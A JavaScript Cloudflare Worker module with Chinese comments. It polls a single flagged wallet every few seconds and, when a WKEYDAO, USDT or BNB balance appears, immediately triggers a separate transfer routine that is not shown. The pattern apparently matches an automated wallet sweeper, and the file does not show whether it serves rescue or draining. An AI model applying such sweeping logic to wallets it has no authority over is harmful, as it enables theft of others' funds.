// cloudflare/extensions/emergency-worker/EmergencyWorkerExtension.js
// Emergency Worker Extension: 应急状态扩展函数
// 功能：作为扩展函数被scan调用，执行应急循环
// 版本：v2.4.1-dev
//
// 关键优化：
// - 不使用分布式锁（已移除）
// - 错误记录改用 Supabase 存储（db.system.saveError）

import { createTacticsScanner } from '../scanner/TacticsScanner.js'

/**
 * 创建Emergency Worker扩展
 */
export function createEmergencyWorkerExtension(env, options = {}) {
  const {
    bnbThreshold = '0.0002', // 统一使用0.0002
    maxDuration = 600,  // 10分钟
    scanInterval = 5,  // 5秒扫描一次
    tokenWkeyDao,
    tokenUsdt,
    // 转账扩展引用
    transferWorker = null,
    db = null,
    // 转账完成回调
    onTransferComplete = null
  } = options

  /**
   * 扫描单个钱包
   */
  async function scanWallet(env, walletAddress, rpcUrl) {
    const scanner = createTacticsScanner(env, {
      walletAddress,
      rpcUrl,
      bnbThreshold: parseFloat(bnbThreshold),
      tokenWkeyDao,
      tokenUsdt,
      maxDuration: 7000
    })

    return await scanner.scan()
  }

  /**
   * 执行应急循环
   * 返回: { success: boolean, transferTriggered: boolean, reason: string, iterations: number, transferResult: object }
   */
  async function runEmergencyLoop(walletAddress, rpcUrl, checkLockCallback) {
    const startTime = Date.now()
    const maxDurationMs = maxDuration * 1000
    const scanIntervalMs = scanInterval * 1000
    let iterations = 0

    console.log(`🚨 [EmergencyWorker] 开始应急模式: ${walletAddress.slice(-4)} (最大时长: ${maxDuration}秒)`)

    while (Date.now() - startTime < maxDurationMs) {
      iterations++

      // 检查锁是否仍有效（通过回调函数）
      const lockValid = await checkLockCallback()
      if (!lockValid) {
        console.log(`⚠️ [EmergencyWorker] 应急状态锁已失效，退出应急模式`)
        return { success: true, transferTriggered: false, reason: 'lock_expired', iterations }
      }

      // 只扫描命中的钱包地址
      console.log(`🔍 [EmergencyWorker] 应急模式扫描命中钱包: ${walletAddress.slice(-4)}`)
      const scanResult = await scanWallet(env, walletAddress, rpcUrl)

      // 检查命中钱包中是否有代币余额需要转账
      let needTransfer = false
      let transferTokenType = null

      if (scanResult.wkeyDaoBalance > 0) {
        needTransfer = true
        transferTokenType = 'wkeydao'
      } else if (scanResult.usdtBalance > 0) {
        needTransfer = true
        transferTokenType = 'usdt'
      } else if (scanResult.bnbBalance > parseFloat(bnbThreshold) * 10) {
        // BNB > 阈值*10 时也转账
        needTransfer = true
        transferTokenType = 'bnb'
      }

      // 如果有代币需要转账，调用转账扩展并立即退出
      if (needTransfer && transferTokenType) {
        console.log(`💸 [EmergencyWorker] 应急模式检测到命中钱包有代币余额，调用转账扩展`)
        console.log(`   代币类型: ${transferTokenType}, 余额: ${scanResult[transferTokenType + 'Balance']}`)

        // 异步调用转账扩展，立即退出应急循环
        if (transferWorker && db) {
          console.log(`🔄 [EmergencyWorker] 触发转账扩展: ${walletAddress.slice(-4)} (${transferTokenType})`)
          console.log(`🚪 [EmergencyWorker] 应急循环立即退出，后续由Aide监控`)

          // 异步调用转账扩展，不等待结果
          transferWorker.runTransferLoop(walletAddress, transferTokenType, db, rpcUrl)
            .then(transferResult => {
              console.log(`✅ [EmergencyWorker] 转账扩展执行完成:`, transferResult)

              // 调用转账完成回调（触发Aide监控）
              if (onTransferComplete && typeof onTransferComplete === 'function') {
                onTransferComplete(transferResult).catch(error => {
                  console.error(`❌ [EmergencyWorker] 调用onTransferComplete回调失败:`, error.message)
                })
              }
            })
            .catch(error => {
              console.error(`❌ [EmergencyWorker] 调用转账扩展失败:`, error.message)

              // 记录错误到 Supabase
              if (db && db.system) {
                db.system.saveError({
                  walletAddress,
                  tokenType: transferTokenType,
                  error: error.message,
                  timestamp: new Date().toISOString()
                }).catch(dbError => {
                  console.error(`❌ [EmergencyWorker] 写入错误记录失败:`, dbError.message)
                })
              }
            })

          // 立即退出应急模式
          return {
            success: true,
            transferTriggered: true,
            reason: 'transfer_started',
            iterations,
            note: 'Aide将监控后续转账和交易确认'
          }
        } else {
          console.error(`❌ [EmergencyWorker] 转账扩展或数据库未初始化，无法执行转账`)
          return {
            success: false,
            transferTriggered: false,
            reason: 'transfer_not_available',
            iterations,
            error: 'Transfer worker or database not initialized'
          }
        }
      }

      // 等待下一次扫描
      await new Promise(resolve => setTimeout(resolve, scanIntervalMs))
    }

    // 超时退出
    console.log(`⏱️ [EmergencyWorker] 应急模式超时，退出`)
    return { success: true, transferTriggered: false, reason: 'timeout', iterations }
  }

  return {
    runEmergencyLoop
  }
}
